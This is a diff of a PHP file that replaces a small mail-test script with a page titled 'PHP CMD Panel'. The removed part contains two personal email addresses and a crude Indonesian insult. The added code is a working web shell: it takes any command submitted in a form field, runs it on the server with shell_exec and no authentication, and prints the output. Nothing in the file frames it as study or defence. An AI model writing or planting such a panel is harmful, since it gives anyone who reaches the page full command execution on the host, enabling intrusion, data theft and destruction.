@@ -1,33 +1,28 @@
 <?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $cmd = $_POST['cmd'];
+        $output = shell_exec($cmd);
+        }
+        ?>
 
-$nama = "testing";
-$email = "latipharkat48@gmail.com";
-$masukan = "lu ngentot";
-$ip = $_SERVER['REMOTE_ADDR'];
-$to = 'latipharkat176@gmail.com';
-$headers = "MIME-Version: 1.0" . "\r\n";
-$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
-$headers .= "From:" . $email;
-$message = "
-            <html>
-            <head>
-              <title>HTML email</title>
-            </head>
-            <body>
-              <p>This email contains HTML Tags!</p>
-              <table>
-                <tr>
-                  <th>Ip</th>
-                  <th>Nama</th>
-                  <th>Pesan</th>
-                </tr>
-                <tr>
-                  <td>{$ip}</td>
-                  <td>{$nama}</td>
-                  <td>{$masukan}</td>
-                </tr>
-              </table>
-            </body>
-            </html>
-            ";
-mail($to, $nama, $message, $headers);
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>PHP CMD Panel</title>
+                    </head>
+                    <body>
+                        <h1>PHP CMD Panel</h1>
+                            <form method="post">
+                                    <label for="cmd">Command:</label>
+                                            <input type="text" name="cmd" id="cmd" required>
+                                                    <button type="submit">Execute</button>
+                                                        </form>
+
+                                                            <?php if (isset($output)): ?>
+                                                                    <h2>Output:</h2>
+                                                                            <pre><?php echo htmlspecialchars($output); ?></pre>
+                                                                                <?php endif; ?>
+                                                                                </body>
+                                                                                </html>
